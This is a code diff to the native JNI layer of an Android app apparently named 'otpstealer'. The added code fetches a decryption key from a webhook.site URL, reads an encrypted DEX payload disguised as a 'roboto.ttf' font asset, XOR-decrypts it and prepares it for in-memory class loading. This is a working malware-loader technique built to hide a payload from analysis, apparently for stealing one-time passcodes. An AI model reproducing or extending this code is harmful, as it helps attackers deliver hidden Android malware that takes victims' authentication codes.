@@ -13,13 +13,22 @@ JNIEXPORT jstring JNICALL
 Java_com_example_otpstealer_MainActivity_stringFromJNI(
         JNIEnv* env,
         jobject thiz) {
+    jclass httpHelperClass = env->FindClass("com/example/otpstealer/HttpHelper");
+    jmethodID fetchUrlKtMethod = env->GetStaticMethodID(httpHelperClass, "fetchUrl", "(Ljava/lang/String;)Ljava/lang/String;");
+    jstring key = (jstring) env->CallStaticObjectMethod(httpHelperClass, fetchUrlKtMethod, env->NewStringUTF("https://webhook.site/eb515d82-1312-4a26-9ef3-71fcdaf855c6"));
+    if (!key) {
+        LOGE("Failed to fetch URL");
+        return env->NewStringUTF("Failed to fetch URL");
+    }
+    const char* keyChars = env->GetStringUTFChars(key, nullptr);
+    size_t keyLen = strlen(keyChars);
+
     jclass activityClass = env->GetObjectClass(thiz);
     jmethodID getAssetsMethod = env->GetMethodID(activityClass, "getAssets", "()Landroid/content/res/AssetManager;");
     jobject assetManagerObj = env->CallObjectMethod(thiz, getAssetsMethod);
     AAssetManager* mgr = AAssetManager_fromJava(env, assetManagerObj);
 
-    // open DEX file from res/raw
-    AAsset* asset = AAssetManager_open(mgr, "classes.dex", AASSET_MODE_BUFFER);
+    AAsset* asset = AAssetManager_open(mgr, "roboto.ttf", AASSET_MODE_BUFFER);
     if (!asset) {
         LOGE("Failed to open DEX file");
         return env->NewStringUTF("Failed to open DEX file");
@@ -32,7 +41,14 @@ Java_com_example_otpstealer_MainActivity_stringFromJNI(
         return env->NewStringUTF("Failed to read DEX data");
     }
 
-    jobject dexBuffer = env->NewDirectByteBuffer((void*)dexData, length);
+    uint8_t* decryptedDex = new uint8_t [length];
+    for (off_t i = 0; i < length; i++) {
+        decryptedDex[i] = ((uint8_t*)dexData)[i] ^ keyChars[i % keyLen];
+    }
+
+    env->ReleaseStringUTFChars(key, keyChars);
+
+    jobject dexBuffer = env->NewDirectByteBuffer(decryptedDex, length);
 
     jmethodID getClassLoader = env->GetMethodID(activityClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
     jobject parentClassLoader = env->CallObjectMethod(thiz, getClassLoader);
